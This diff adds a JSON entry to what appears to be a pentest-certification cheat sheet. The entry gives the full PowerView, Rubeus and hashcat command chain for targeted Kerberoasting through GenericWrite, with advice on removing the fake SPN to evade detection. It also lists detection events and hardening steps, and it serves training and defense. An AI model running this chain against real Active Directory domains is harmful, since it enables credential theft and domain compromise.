@@ -1,0 +1,88 @@
+{
+  "id": "ad-acl-targeted-kerberoast",
+  "name": "PowerView - Targeted Kerberoast via GenericWrite",
+  "command": "Set-DomainObject -Credential $Cred -Identity <target> -SET @{serviceprincipalname='nonexistent/BLAH'} -Verbose",
+  "description": "Abuses GenericWrite over a user account to temporarily set a fake SPN, making the account kerberoastable. Request the TGS ticket, crack it offline, then clean up the fake SPN. Used when you have GenericWrite on an account that doesn't already have an SPN but has a valuable password to crack.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Privilege Escalation",
+  "subcategory": "ACL Abuse",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "acl-abuse",
+    "kerberoasting",
+    "genericwrite",
+    "powerview",
+    "targeted"
+  ],
+  "mitre": [
+    "T1558.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== WHY SET A FAKE SPN? ===\nKerberoasting requires the target account to have a Service Principal Name (SPN).\nIf your target account (e.g., adunn — DA member) has no SPN, you can't directly\nkerberoast them. But if you have GenericWrite over the account, you can SET a fake\nSPN, making the account kerberoastable, then clean it up afterward.\n\nThe DC will encrypt a TGS for the fake service using adunn's NT hash — exactly\nlike a real kerberoast. Crack offline → DA password → game over.\n\n=== FULL CHAIN ===\n# 1. Check target account (no SPN currently)\nGet-DomainUser -Identity adunn | select samaccountname,serviceprincipalname\n\n# 2. Create cred for the GenericWrite holder (damundsen)\n$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\damundsen', $SecPassword2)\n\n# 3. Set fake SPN on target account\nSet-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='nonexistent/BLAH'} -Verbose\n\n# 4. Verify SPN was set\nGet-DomainUser -Identity adunn | select samaccountname,serviceprincipalname\n\n# 5. Kerberoast the target\n.\\Rubeus.exe kerberoast /user:adunn /nowrap  (or GetUserSPNs.py with creds)\n\n# 6. Crack the TGS with hashcat -m 13100\nhashcat -m 13100 adunn.hash /usr/share/wordlists/rockyou.txt\n\n# 7. CLEAN UP the fake SPN\nSet-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose\n\n=== WHY CLEAN UP ===\nA fake SPN on a user account is a clear indicator of compromise — security tools\nand admins will notice. Always remove it immediately after capturing the hash.\nIf the account is a DA or admin and an admin notices the SPN, the engagement is\nblow — clean up fast.\n\n=== IMPORTANT: WHAT GETS ENCRYPTED ===\nThe TGS for the fake SPN is encrypted with the target's RC4 (or AES256) hash,\nFIRST checking what encryption types the DC and account support. If AES is\nenforced, hashcat mode 19700 is needed instead of 13100 — much harder.",
+  "examples": [
+    {
+      "label": "Set fake SPN",
+      "command": "Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='nonexistent/BLAH'} -Verbose"
+    },
+    {
+      "label": "Verify SPN set",
+      "command": "Get-DomainUser -Identity adunn | select samaccountname,serviceprincipalname"
+    },
+    {
+      "label": "Clear fake SPN after roasting",
+      "command": "Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose"
+    }
+  ],
+  "references": [
+    {
+      "title": "PowerView (PowerSploit)",
+      "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
+    },
+    {
+      "title": "Targeted Kerberoasting (harmj0y)",
+      "url": "https://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-rubeus-kerberoast-user",
+      "note": "Roast the account now that it has an SPN.",
+      "rel": "next"
+    }
+  ],
+  "defense": {
+    "why_it_works": "With GenericWrite over a target user, sets a temporary SPN, Kerberoasts the account to get a crackable hash, then removes the SPN (targeted Kerberoasting).",
+    "prerequisites": "GenericWrite (or write to servicePrincipalName) over the target user.",
+    "impact": "A crackable TGS hash for a user who had no SPN - cracking yields their password.",
+    "detection": "[MITRE T1558.003] Event 5136 (servicePrincipalName added to a user) by a non-admin, immediately followed by a 4769 TGS request for that user, then the SPN removed.",
+    "artifacts": "5136 SPN add/remove; a 4769 for the target; the extracted hash.",
+    "prevention": "Audit write access to servicePrincipalName; alert on SPN changes on user accounts correlated with 4769; strong passwords defeat the crack.",
+    "evasion": "Remove the SPN immediately after roasting; RC4 downgrade keeps the ticket crackable.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1558.003"
+    ],
+    "misconfiguration": "Non-privileged users or groups have been granted sensitive AD object permissions (WriteDACL, GenericAll, GenericWrite, ForceChangePassword, AddMember, etc.) through misconfigured delegation, 'inherited from parent' ACEs copied at provisioning time, or direct one-off grants. Because AD ACEs are not surfaced in the normal GUI, these often persist for years.",
+    "vulnerable_config": "# Example: a help-desk group has ForceChangePassword on Domain Admins members\n# Found via BloodHound 'ForceChangePassword' edge, or PowerView:\nGet-ObjectAcl -Identity 'Domain Admins' -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'ResetPassword'} |\n  Select-Object IdentityReference, ActiveDirectoryRights, ObjectType\n\n# Another dangerous pattern — GenericWrite on a user (enables targeted Kerberoasting):\nGet-ObjectAcl -Identity 'svc_sql' -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'GenericWrite'}",
+    "secure_config": "# 1. Run AD ACL audit quarterly (automated):\n# BloodHound: Mark all Domain Admins as 'High Value', find paths from low-priv users\n# PowerView batch:\nGet-DomainObjectAcl -ResolveGUIDs |\n  Where-Object {$_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDACL|WriteOwner'} |\n  Where-Object {$_.IdentityReference -notmatch 'Domain Admins|Enterprise Admins|SYSTEM'} |\n  Export-Csv acl_review.csv\n\n# 2. Remove dangerous ACEs:\nRemove-DomainObjectAcl -TargetIdentity 'svc_sql' \\\n    -PrincipalIdentity 'helpdesk' -Rights GenericWrite\n\n# 3. Enable AD Protected Users group for privileged accounts\n# 4. Use tiered administration (Admin Tier 0/1/2) to limit blast radius"
+  },
+  "tools": [
+    "PowerView"
+  ]
+}
